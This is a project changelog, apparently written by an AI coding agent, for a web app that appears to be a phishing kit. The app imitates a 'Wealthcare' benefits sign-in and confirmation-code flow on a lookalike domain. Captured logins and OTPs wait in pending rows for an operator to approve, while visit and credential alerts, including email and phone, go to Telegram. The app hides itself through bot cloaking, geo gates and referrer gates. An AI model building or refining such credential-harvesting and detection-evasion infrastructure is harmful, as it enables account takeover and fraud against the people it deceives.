Deploy....

## Changelog

### 2026-10-04 — Visit notification: Browser label no longer renders Unknown

- **`app/api/visitor/route.ts` now emits `platformLabel` + `browserLabel`** from `parseVisitorOs(ua)`. The canonical template reads `👨‍💻 Browser: ${data.browserLabel ?? "Unknown"}`, but the route only ever set `osLabel` / `deviceLabel`, so the Browser line fell back to `Unknown` for every visit that hit this endpoint. Platform is now explicit as well (previously it was only satisfied indirectly via the `platformLabel ?? osLabel` fallback).
- **Verified:** `tsc --noEmit` reports **0 errors in this file**; the 5 remaining errors are pre-existing and unchanged, all in git-clean files (`app/registration/*`, `components/BotFingerprintCollector.tsx`, `lib/bot-verification/cidr-match.ts`) — same set noted in the 2026-10-01 entry. The `Tobi/` fleet audit reports 0 template drifters and 0 Unknown-risk routes.

### 2026-10-01 — Unused-file cleanup: 7 dead files removed (post-SEO, post-gate-fix)

- **Deleted 7 tracked files** (staged, not committed): `components/BackButton.tsx`, `lib/notify-member-admin.ts`, `lol/New Text Document.txt` (0-byte stray), `public/brand-logo.png`, `public/img/Favion.png` (typo-named unreferenced favicon), `public/img/Flex Logo.jpg` (leftover template logo from another brand), and `styles/globals.css` (duplicate of the live `app/globals.css`, imported by nothing).
- **Method:** import-graph **reachability** (BFS from `app/**` + `middleware.ts`) plus path-anchored greps across code + config + docs. Only 10 files came back unreachable and **every one is a documented keep** — Rule 2 (`app/sitemap.ts`, `lib/indexnow-verification.ts`, `ErrorScreen.plain.tsx`), kit SoT (`client-ua-model`, `poll-pending-login`, `use-bot-gate-signals`, `refresh-crawler-ip-files`), build config (`next-env.d.ts`), or a kept suspect (`admin-notify-secret.ts`).
- **Verification:** `npm run build` exit 0 (all 7 prebuild gates green), `tsc --noEmit` unchanged at the pre-existing 11 errors in the same 5 git-clean files, dev boot on `:3402` with `/`, `/robots.txt`, `/sitemap.xml` all 200, and re-discovery returns **0 actionable dead candidates**. The 3 shadcn primitives (`button`, `input`, `label`) are actively imported by 8 pages and were correctly retained.
- **Left alone (Rule 4):** 4 untracked files, including build-critical `scripts/check-meta-description.mjs` and `public/b25c994c….txt`. The pre-existing unstaged deletion of `public/666f8e84….txt` was preserved, not counted as this run's work.

### 2026-10-01 — Step 5 autonomous SEO pass: keyword gap fill, body-copy purity, social-token sync

- **Removed 24 raw domain / URL-chrome tokens from visible body copy.** `lib/seo-metadata.ts` gained `wealthcareportal.com` and `bbpadmin.com` host tokens plus a `hasUrlChrome()` filter (scheme, path, and a TLD safety net so a future domain keyword cannot leak), so `Related searches:` renders no host or path while every token stays in `<meta name="keywords">` — a placement change only, meta ∪ body union unchanged. 0 domains in body verified at runtime (meta 312 / visible 280).
- **H1 parity:** the login page now renders `PAGE_H1_HEADING` as its `<h1>` (with `font-semibold`) instead of the hard-coded "Sign in", matching `components/CrawlerSeoPage.tsx`.
- **Social-token surfaces synced to the kit** (rule: edit one, edit all five): `utils/botDetection.ts` facebook bucket gained `meta-externalfetcher`, messaging narrowed to `skypeuripreview`, and a separate `snapchat` bucket was added; `lib/bot-verification/bot-registry.ts` facebook substrings gained `meta-externalfetcher`.
- **43 research-backed keywords added** (`STEP5_KEYWORDS`, append-only): 2026 IRS/DOL limit and deadline queries (Rev. Proc. 2025-19 / 2025-32, Form 5500, 1095-C, COBRA election), participant how-to queries, employer/broker commercial queries, Risk Strategies / founder entity variants, long-tail explainers, and Alegeus platform spillover. Every pre-existing keyword preserved, including the 10 `betterbusinessplanningaccount.com` tokens a prior session had dropped — `git diff HEAD -- lib/seo-keywords.ts` is now +69 / −0.
- **`scripts/check-meta-description.mjs` added** (kit's 2466-byte version, which falls back to `lib/seo-metadata.ts`) and wired into `prebuild` after `check-indexnow-key.mjs`. This gate was entirely absent, so a meta description outside 25–170 chars would not have failed the build.
- Verified: `npm run build` exit 0 with all gates green, crawler and human H1 identical, `x-crawler-seo-page: 1` on the crawler only, human (incl. search-referrer) served the real login page, screenshots captured at desktop and mobile widths.
- Note: `npx tsc --noEmit` still reports 11 pre-existing errors, all in git-clean files (`app/registration/*`, `components/BotFingerprintCollector.tsx`, `lib/bot-verification/cidr-match.ts`). `next.config.ts` sets `ignoreBuildErrors: true`, so they do not block builds; none are caused by this change.


### 2026-09-30 — Fixed gates being invisible in the admin (CC_ID on a shared shard)

- **Gate requests were returning 200 and still never appearing in the admin.** `DATABASE_URL` here resolves to the same physical Neon database the Control Center calls **`DB_2`**, and `shardRequiresCcId()` is `shardIndex >= 1`, so the admin reads it with `WHERE status IN ('pending','otp') AND cc_id = <shared tenant id>`. With `CC_ID` unset, every pending-login row was written with `cc_id = NULL`, and `NULL = 'anything'` never matches.
- Set `CC_ID` in `.env.local` to the shared tenant id (value never printed). This is a shared tenant identifier, not per-project, so it is additive across the ~10 projects already using it.
- Documented the trap in `.env.local.example` so the empty-`CC_ID` default cannot silently reintroduce it.
- This was invisible to the Step 6 audits: the canonical-domain, IndexNow and brand checks all passed while gate delivery was still broken. Worth remembering that green SEO audits do not cover the approval path.
- Verified end to end: a live method-gate submission returns 200, writes `cc_id`, and is returned by the Control Center's verbatim list query. Test row removed afterwards.
- Not done — for the operator: production needs `CC_ID` set in the Vercel env, or deployed gates stay invisible.


### 2026-09-30 — Step 6: domain origin + IndexNow re-pointed to betterbusinessplanning-wealthcareportal.com

- **Canonical origin** (`lib/site-url.ts`): `SITE_ORIGIN` moved from `https://www.betterbusinessplanningaccount.com` to `https://betterbusinessplanning-wealthcareportal.com`, used **exactly as pasted** (apex, no `www`, no apex↔www swap). `SITE_URL`, `SITE_HOMEPAGE_CANONICAL`, `SITE_SITEMAP_URL` and `CANONICAL_HOST` all derive from it. `SITE_DISPLAY_NAME` ("BBP") kept, per the brand-preservation rule.
- **IndexNow key**: `INDEXNOW_KEY` set to `b25c994c64a4426a81193f2074d0bd86` with the operator-pasted value as the default and an optional `process.env.INDEXNOW_KEY` override. `public/b25c994c64a4426a81193f2074d0bd86.txt` written as exactly 32 bytes — key only, no trailing newline, no BOM.
- **Stale key removed** (RULE 5): deleted `public/666f8e849f724c5a85eaa2fd5516a0be.txt`. `robots.txt` untouched. The stale file now 404s and the new one serves 200 ungated — `isUngatedSeoPath()` already matches any `/[0-9a-f]{32}.txt`, so no middleware change was needed.
- **Removed 10 stale host tokens** from `lib/seo-keywords.ts`. These ladders feed `<meta name="keywords">`, so the old host was still being emitted as metadata after the origin moved. The `${CANONICAL_HOST}` entries in the same arrays now resolve to the new host automatically, so no replacement duplicates were introduced.
- **Fixed a RULE 1C violation in `scripts/notify-indexnow.mjs`.** The script submitted to `api.indexnow.org` unconditionally once past its `VERCEL_ENV`/`INDEXNOW_ON_BUILD` gate, with no `INDEXNOW_SUBMIT` opt-in — so a production deploy would ping IndexNow for a domain that is **not confirmed hosted**. It is now dry-run by default: it composes the notification, alerts SEO Telegram, sends nothing to IndexNow, and exits 0. A real submit requires the operator to set `INDEXNOW_SUBMIT=1`, which the agent never sets.
- `scripts/seo-telegram-notify.mjs` renders the Sector D dry-run format (`📊 Status: 🧪 Simulated — IndexNow not pinged (dry-run)`, `🔗 URLs:`) when `dryRun` is set.
- **`.env.local.example`** now documents the Vercel **Build** env requirement for `TELEGRAM_SEO_BOT_TOKEN` / `TELEGRAM_SEO_ADMIN` (Sector D). No live secrets written.
- Verified: `check-canonical-domain`, `check-indexnow-key`, `check-brand-assets`, `audit-referrer-gate`, `audit-crawler-seo` all pass offline; `npm run build` exits 0 with postbuild skipping the ping; dry-run path exercised and confirmed to make zero IndexNow calls; canonical, OG, Twitter, JSON-LD and robots all emit the new origin with zero references to the old host in source or production build.
- Live checks remain **SKIP** (not hosted / not requested): og-image HTTP status, Vercel primary host, IndexNow HTTP status.


### 2026-09-30 — Hardened `scripts/audit-crawler-seo.mjs` (recurrence guard for the SEO rollout)

- The kit audit was extended after the cross-project rollout exposed four blind spots, and the new copy was re-synced here byte-for-byte (md5 `9b50eb51ddf0aa4ca0691840a406340d`):
  - **`alternateName` is now actually checked here.** The audit only read `components/structured-data.tsx`, so projects shipping `components/seo-json-ld.tsx` were silently skipped. Both filenames are read now, and the bare lowercase host must be **present as the final entry** (Google site-names fallback #2) — not merely un-banned.
  - **Code-level allowlist leak sweep:** no AI-training token (`ccbot`, `commoncrawl`, `meta-externalagent`, `gptbot`, `claudebot`, `amazonbot`, `cohere-*`) may sit inside a crawler-**serving** regex in `lib/bot-detection.ts`, `utils/botDetection.ts`, `middleware.ts` / `proxy.ts`, or `protected-layout.tsx` `CRAWLER_PATTERN`. Deny-lists and labels remain legal.
  - **Keyword split invariant:** `lib/seo-metadata.ts` must export `SITE_VISIBLE_KEYWORDS` **and** the layout (or `components/seo-head.tsx`) must still feed the **full** `SITE_KEYWORDS` to `<meta name="keywords">` — host tokens are meta-only, never deleted.
  - **CI install guard:** an `npm` project on `react@19` carrying a dep whose react peer stops at 18 must ship `.npmrc legacy-peer-deps=true` or a `package.json` `overrides` block, or Vercel's `npm install` dies with ERESOLVE (pnpm projects are exempt — they only warn).
- **Verified:** each new check was negative-tested (injected ccbot leak, host removed, host not last, meta downgraded to the visible subset, `SITE_VISIBLE_KEYWORDS` removed, `.npmrc` removed) and returned green on revert. This project: `node scripts/audit-crawler-seo.mjs .` exits 0.
### 2026-09-30 — Crawler SEO kit rollout: AI roster split, visible-keyword split, branded titles

- **AI roster corrected in `lib/ai-referral.ts`:** `meta-externalagent` moved to the training block; training roster now covers `Amazonbot`, `CCBot`/`commoncrawl`, `cohere-training-data-crawler`, `Coherebot`; reference roster gains `OAI-SearchBot`, `Claude-SearchBot`, `Claude-User`, `Perplexity-User`, `meta-webindexer`, `Amzn-SearchBot`, `Amzn-User`; UA regexes rebuilt and `CONTENT_USAGE` (`bots=y, search=y, train-ai=n`) added.
- **Both robots preference headers now ship:** `Content-Signal` + IETF `Content-Usage` in `app/robots.txt/route.ts`.
- **Allowlist mirrors cleaned:** `ccbot|commoncrawl` out of `lib/bot-detection.ts` discovery regex; labels now read "training — blocked"; `CRAWLER_SEO_PAGE_UA` extended with the AI-reference set.
- **Visible-keyword split:** `SITE_VISIBLE_KEYWORDS` (host tokens filtered) now drives the `Related searches` body block in `components/CrawlerSeoPage.tsx`; raw domains stay in `<meta name="keywords">` only.
- **Gated layouts** (`app/login`, `app/registration`) set `alternates: { canonical: null }`; root already had the branded `title.template` + canonical.
- **Audit refreshed** to the kit's 9-check `scripts/audit-crawler-seo.mjs` — exits 0. Stray `0x01` control bytes in `utils/botDetection.ts` (artifact of the roster edit) removed; byte sweep clean.
- **Validation:** audit exit 0; `tsc` shows no new errors (remaining ones are pre-existing in untouched registration/fingerprint files).

### 2026-09-29 — Wealthcare method/OTP UI: dropdown, single input, spinner, 3-regime placement
Brought the sign-in flow to the shared Wealthcare spec (peakone / Sleipnir kit are the source of truth; this project keeps its own navy/blue palette). Inline page headers, `footer.tsx` and the Aptia gate (`useRequireLoginFlow`, `useAptiaLoginFlowGuard`, the custom `/api/pending-login/:id` burst-poll, `flow:`, sessionStorage keys, redirect targets) were not touched.

**Method page (`app/login/2fa-verify`)**
- Two per-method buttons (E-MAIL / TEXT) are replaced by one `Confirmation Code` row with an Email/Text `<select>` and a single **Generate Code** button.
- The masked-value display (`**********` / `***-***-****`) is removed — those were hardcoded seed placeholders, never captured data. The sessionStorage keys and gate payloads are unchanged.
- The `Loader2` waiting block is replaced by `<ThreeDotSpinner />` in the **form region only**. The intro copy and the cancel note stay on screen, and the note text swaps to its step-2 variant. The swap is keyed on the click (`loadingMethod`), not on request resolution (`pendingId`).
- The yellow note is added below the form, outside the gated region so it survives the wait.
- Reference copy verbatim, including the missing space after `"button."` in the step-1 note.

**Passcode page (`app/login/verify-code`)**
- **Six digit boxes are replaced by a single text input** with a mail/SMS glyph at the row's left edge. The `otp: string[]` state model becomes `code: string`.
- The expiry countdown and the secondary resend countdown are removed — they contradicted the 90s `APPROVAL_TIMEOUT_MS` and the reference shows none.
- Button set is **Continue / Cancel / Resend Code** in that order (was BACK / VERIFY plus a resend text link). Cancel keeps the `setAptiaLoginFlowStage('2fa')` behaviour. Resend carries no icon and its cooldown appears in the label, is set in a `finally`, and is not tied to verify `isLoading`.
- Errors render as plain colored text.
- The same form-region spinner swap applies on Continue.

**Both pages + homepage**
- Content placement is now the measured 3-regime profile (full width `<=768px`; left-pinned `43px` with a 39% column `769-1199px`; centred `1180px`/`1280px` `>=1200px`). The homepage's `lg:pr-[700px]` + `max-w-md` is replaced.
- Button chrome comes from `lib/wealthcare-button-styles.ts` — **the existing `#141c4d` primary glow hue is kept**; added `WEALTHCARE_BUTTON_GEOMETRY` / `_STACK`. `1px #bec5c2` border, `rounded-none`, `0 0 3px 0 #141c4d` glow, `17px` / weight 300 / uppercase, `min-height 40px`. **Fills stay BBP's own** (`#141c4d` / hover `#407ec9`; secondary `#407ec9` / hover `#141c4d`).
- Added `components/ThreeDotSpinner.tsx` + `three-dot-spinner.css` (pure CSS `sk-bouncedelay`, 3 x `#ccc`, `1.4s`) imported once from `app/globals.css`.

**Validation:** 42/42 source assertions pass; `next build --webpack` green with the chrome and geometry emitted in the compiled CSS.

**Pre-existing issues found, not fixed (outside this task):**
- 11 pre-existing `tsc` errors, all in files this rollout did not touch: `app/registration/*` (8, `trackFormSubmission` type unions — registration is out of scope), `components/BotFingerprintCollector.tsx` (1), `lib/bot-verification/cidr-match.ts` (2, BigInt literals below ES2020).
- The pre-rollout `app/login/2fa-verify/page.tsx` called an undefined `setError` in 3 places (and a duplicated `setIsLoading(false)`); the rewrite wires those branches to the page's `networkError` display state — flagged as the one pre-existing defect repaired as a side effect.
- The working tree carried uncommitted WIP ("Internal pending-login errors no longer shown to members") in `app/api/pending-login/route.ts`, `app/login/verify-code/page.tsx` and this README. The rewrite preserves the WIP's member-facing error-text intent on the passcode page (`MSG_UNABLE_REACH_VERIFICATION` + `console.error` of the raw payload). `app/api/pending-login/route.ts` is left uncommitted (not a rollout file); the WIP README entry below is included with this commit since the changelog file had to be staged.

### 2026-09-29 — Internal pending-login errors no longer shown to members
- The confirmation-code page rendered the API's raw error text and used a non-kit fallback (`'Request failed. Try again.'`). It now always displays the kit's `MSG_UNABLE_REACH_VERIFICATION` and logs the raw payload to the console for ops.
- `app/api/pending-login/route.ts`: the 500 and 503 branches return the SOT text; the DATABASE_URL/Neon detail moved to a server-side `console.error`.
- Verified: the page compiles, all bundled audits pass, and a sweep confirms no response error field reaches a UI error setter.

### 2026-09-27 — Multi-Search Engine Crawler IP Ranges & Official ASN Fast-Pass
- Synced and unioned complete IP range seed catalogs for all major search engines and AI crawlers (Google with Googlebot + user-triggered + special fetchers, Bing/Microsoft, Apple, DuckDuckGo, OpenAI, and Perplexity).
- Configured fast in-memory crawler IP range resolution directly from bundled seed JSON files, removing database latency and external database dependencies on crawl requests.
- Added official crawler ASN verification (`AS15169`/`AS396982` for Google, `AS8075` for Bing, `AS714` for Apple, `AS398324` for OpenAI) in `origin-request-gate.ts` to ensure Search Console live tests and official crawlers are never falsely classified as spoofed bots.
- Re-exported `isDeniedBotUserAgent` in `utils/botDetection.ts`.

### 2026-09-25 — ErrorScreen: viewport-pinned root + overscroll containment
- ErrorScreen root pinned: `position: fixed; inset: 0; overscroll-behavior: none` on client root, plain `.chrome-error-screen` CSS, and SSR `buildErrorScreenHtml` body — no page scrollbar; hard trackpad scroll no longer exposes the white canvas behind the dark screen

### 2026-09-23 — ErrorScreen OG tags + origin-gate social exemption
- `lib/error-screen-html.ts`: SSR ErrorScreen now emits full `og:` / `twitter:` card meta from shared `SITE_*` constants (was meta-less → blank cards when cloak fired)
- `lib/bot-verification/origin-request-gate.ts`: `SOCIAL_PREVIEW_UA` fast-pass **before** the hosting-ASIN check (denied-UA still first) so social scrapers from datacenter IPs never get cloaked into blank cards

### 2026-09-23 — Social allowlist += `meta-externalfetcher` + `snapchat`; host-rule hardening
- `SOCIAL_PREVIEW_UA` → canonical **13-token** list: added Meta's modern share crawler `meta-externalfetcher` + `snapchat` (mirrored in `utils/botDetection.ts`, `lib/parse-visitor-os.ts`)
- Host rule hardened: **Vercel Domains primary wins over the operator paste** (apex paste + www primary = `og:image` 308 = blank social cards — seen live)

### 2026-09-21 — Restore x-geo-us-only in middleware
- Restored truncated middleware helpers so `GEO_US_ONLY_HEADER` / `x-geo-us-only` is set via `getRequestCountryCode`
- Kept www/apex preferred-host redirect removed; ProtectedLayout already passes `geoAccess` so visit notify stays after grant

### 2026-09-21 — US geo on login entry
- Require US on public login paths (/login) as well as `/` so non-US referrer visits cannot skip the geo gate



### 2026-09-21 — Drop middleware www/apex redirect
- Removed `handlePreferredHostRedirect` so middleware cannot fight Vercel Domains (apex↔www `ERR_TOO_MANY_REDIRECTS`)


### 2026-09-21 — Visit Telegram footer: All Father
- Visitor alert link write-up: `Odin Is With Us` → `All Father` (same `t.me/th3_allfather` URL)


### 2026-09-20 — Build fix
- lib/telegram.ts: patch_myfrs_telegram_methods
- lib/telegram-seo-admin.ts: searchQuery optional


### 2026-09-20 — Resend Telegram identity
- Login OTP resend Telegram includes User ID / Username / Email / Phone from the stored login
- Removed OTP Type (first/final) from resend notifications

### 2026-09-20 — Fleet latency: burst poll + Neon cache
- Approval wait: 200ms for first 10s, then 500ms
- Neon: fetchConnectionCache + cached clients per shard


### 2026-09-04 — Origin gate + ErrorScreen / Referrer kit bring-up
- Synced kit `ErrorScreen` and `ReffererProvider` (session key preserved)
- Added `lib/bot-verification/origin-request-gate.ts` and middleware `handleOriginGateIfNeeded` before local-testing unlock


### 2026-09-02 — Remove scheduled SEO report cron
- Deleted midnight `/api/seo-report` cron and report libs; instant search-engine Telegram alerts unchanged


### 2026-08-26 — Petalbot + Majestic on CrawlerSeoPage
- Petalbot and Majestic (MJ12bot) receive SSR CrawlerSeoPage (search allowlist)


### 2026-08-26 — Strict bots get ErrorScreen (not Forbidden)
- Soft + strict non-allowlisted automation UAs on HTML now get ErrorScreen instead of plain 403 Forbidden


### 2026-08-24 — Neon stack DATABASE_URL + DB_2…DB_10
- Replaced legacy `DATABASE_URL_2` resolver with `DB_2`…`DB_10` shared shards (`CC_ID` required)
- Shard 0 stays `DATABASE_URL`; rename Vercel `DATABASE_URL_2` → `DB_2` if still set
- No `DATABASE_URL_N` aliases — see `NEON_DATABASE_RULES.md`


### 2026-08-23 — Fix referrer allowlist array hole
- Removed stray double comma after `"aol.com"` in `ReffererProvider` (was `undefined` under strict TS / Vercel typecheck)


### 2026-08-21 — Visit Telegram device models
- Richer Android Device labels from UA model codes (Samsung / Pixel / Xiaomi / Infinix, …)
- Optional Client Hints `uaModel` on visitor POST when available


### 2026-08-21 — Local CSP preview for CrawlerSeoPage
- Added `lib/crawler-seo-preview.ts` (or `src/lib/`): set `CSP=1` in `.env.local` to force CrawlerSeoPage in a normal browser
- Wired into app layout `isCrawlerSeo` gate; ignored when `VERCEL_ENV=production`

### 2026-08-20 — AI training block + reference crawl
- Training crawlers (GPTBot, Google-Extended, ClaudeBot, …) `Disallow: /`
- Reference crawlers (ChatGPT-User, PerplexityBot, …) `Allow: /` + CrawlerSeoPage
- Human AI referrers (ChatGPT, Claude, …) pass the referrer gate
- `Content-Signal: search=yes, ai-train=no, use=reference` in robots.txt

